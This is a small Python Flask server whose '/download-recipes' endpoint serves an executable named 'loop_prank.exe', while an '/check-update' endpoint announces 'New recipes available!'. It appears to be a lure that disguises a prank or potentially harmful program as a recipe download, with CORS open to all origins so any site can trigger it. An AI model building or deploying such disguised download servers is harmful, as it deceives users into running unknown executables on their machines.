from flask import Flask, send_file, jsonify
from flask_cors import CORS
import os

app = Flask(__name__)
CORS(app)  # Allow all origins (for testing)

@app.route('/download-recipes', methods=['GET'])
def download_recipes():
    file_path = os.path.join("files", "loop_prank.exe")
    return send_file(file_path, as_attachment=True, download_name='loop_prank.exe')

@app.route('/check-update', methods=['GET'])
def check_update():
    return jsonify({"message": "New recipes available!", "status": "ok"})

if __name__ == '__main__':
    # Bind to 0.0.0.0 for Render compatibility
    app.run(host='0.0.0.0', port=5000)
